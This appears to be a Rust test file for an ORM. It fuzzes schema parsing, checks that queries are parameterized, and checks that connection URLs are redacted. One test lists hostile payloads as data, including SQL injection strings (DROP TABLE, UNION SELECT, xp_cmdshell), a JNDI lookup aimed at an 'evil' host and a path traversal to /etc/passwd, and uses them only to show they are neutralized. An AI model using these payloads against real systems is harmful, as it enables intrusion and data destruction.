use rustorm::query::{Field, Insert, Select, Update, Delete, Value};
use rustorm::schema;

#[test]
fn dummy() { assert!(true); }

#[test]
fn fuzz_schema_rejects_deferrable_set_default() {
    let base = "datasource db { provider = \"postgresql\" url = env(\"DATABASE_URL\") }";
    let cases = [
        format!("{base} model User {{ id Int @id posts Post[] }} model Post {{ id Int @id author User @relation(fields: [authorId], references: [id], onDelete: Cascade, onUpdate: Cascade) authorId Int }} deferrable"),
        format!("{base} model User {{ id Int @id val String }} deferrable"),
        format!("{base} model User {{ id Int @id other Other @relation(fields: [oId], references: [id], onDelete: SetDefault, onUpdate: Cascade) oId Int }} model Other {{ id Int @id }}"),
        format!("{base} DEFERRABLE model User {{ id Int @id }}"),
    ];
    for (i, c) in cases.into_iter().enumerate() {
        let res = schema::parse(&c);
        assert!(res.is_err(), "case {i} should be rejected: {}", c);
    }
    let ok = format!("{base} model User {{ id Int @id posts Post[] }} model Post {{ id Int @id author User? @relation(fields: [authorId], references: [id], onDelete: SetNull, onUpdate: Cascade) authorId Int? }}");
    assert!(schema::parse(&ok).is_ok(), "SetNull should be allowed");
}

#[test]
fn fuzz_schema_no_panic_on_random() {
    let seeds = ["", " ", "\n", "model", "datasource", "{{{{", "}}}}", "@@@", "'; DROP", "model User { id Int @id } deferrable"];
    for s in seeds {
        let _ = schema::parse(&s);
        let _ = schema::format(&s);
    }
    let mut x = 0x12345678u32;
    for _ in 0..1000 {
        x = x.wrapping_mul(1664525).wrapping_add(1013904223);
        let len = (x % 80) as usize;
        let mut s = String::with_capacity(len);
        for _ in 0..len {
            x = x.wrapping_mul(1664525).wrapping_add(1013904223);
            let c = (x % 95 + 32) as u8 as char;
            s.push(c);
        }
        let _ = schema::parse(&s);
        let _ = schema::format(&s);
        let field: Field<String> = Field::new("t", "x");
        let _ = Select::new("t", &["x"]).where_(field.equals(s.clone())).compile();
    }
}

#[test]
fn fuzz_all_query_builders_are_parameterized() {
    let f: Field<i32> = Field::new("t", "id");
    let s: Field<String> = Field::new("t", "name");
    let q1 = Select::new("t", &["id"]).where_(f.equals(1)).compile().unwrap();
    assert!(q1.sql.contains("$1"));
    let q2 = Insert::new("t", &["id", "name"]).set(f, 1).set(s, "a".to_string()).compile().unwrap();
    assert!(q2.sql.contains("$1") && q2.sql.contains("$2"));
    let q3 = Update::new("t").set(s, "b".to_string()).where_(f.equals(1)).compile().unwrap();
    assert!(q3.sql.contains("$1") && q3.sql.contains("$2"));
    let q4 = Delete::new("t").where_(f.equals(1)).compile().unwrap();
    assert!(q4.sql.contains("$1"));
}

#[cfg(feature = "postgres")]
#[test]
fn expurgation_poolconfig_does_not_leak_url() {
    let cfg = rustorm::postgres::PoolConfig::new("postgres://user:secret@localhost/db?sslmode=verify-full", 5);
    let dbg = format!("{:?}", cfg);
    assert!(!dbg.contains("secret"));
    assert!(!dbg.contains("postgres://"));
    assert!(dbg.contains("[REDACTED]"));
    let pool = rustorm::postgres::Pool::new("postgres://user:s3cret@127.0.0.1/db".to_string(), 5);
    let dbg2 = format!("{:?}", pool);
    assert!(!dbg2.contains("s3cret"));
    assert!(!dbg2.contains("postgres://"));
}

#[cfg(feature = "postgres")]
#[test]
fn expurgation_errors_redact_url() {
    use rustorm::postgres::Error;
    let errs = [
        Error::Connection,
        Error::Invalid("bad input".into()),
        Error::Server { code: Some("23505".into()) },
        Error::UniqueViolation { constraint: Some("c".into()), table: Some("t".into()), code: Some("23505".into()) },
        Error::ForeignKeyViolation { constraint: Some("fk".into()), code: Some("23503".into()) },
        Error::NotFound { code: Some("P0002".into()) },
        Error::Timeout,
        Error::Cancelled,
    ];
    for e in errs {
        let s = format!("{}", e);
        assert!(!s.contains("postgres://"));
        let dbg = format!("{:?}", e);
        assert!(!dbg.contains("postgres://"));
    }
    let url = "postgres://user:secret@localhost/db";
    let redacted = rustorm::postgres::redacted_url(url);
    assert_eq!(redacted, "[REDACTED]");
}

#[test]
fn fuzz_injection_payloads_are_parameterized() {
    let table = "users";
    let email: Field<String> = Field::new(table, "email");
    let payloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; DELETE FROM users WHERE ''='",
        "\" OR \"\"=\"",
        "1; SELECT * FROM users",
        "' UNION SELECT * FROM users --",
        "${jndi:ldap://evil}",
        "../../etc/passwd",
        "\0",
        "'; EXEC xp_cmdshell('dir') --",
    ];
    for p in payloads {
        let q = Insert::new(table, &["email"]).set(email, p.to_string()).compile().unwrap();
        assert!(q.sql.contains("$1"));
        if p.len() > 2 && p != "\0" {
            assert!(!q.sql.contains(p));
        }
        assert_eq!(q.params.len(), 1);
    }
}
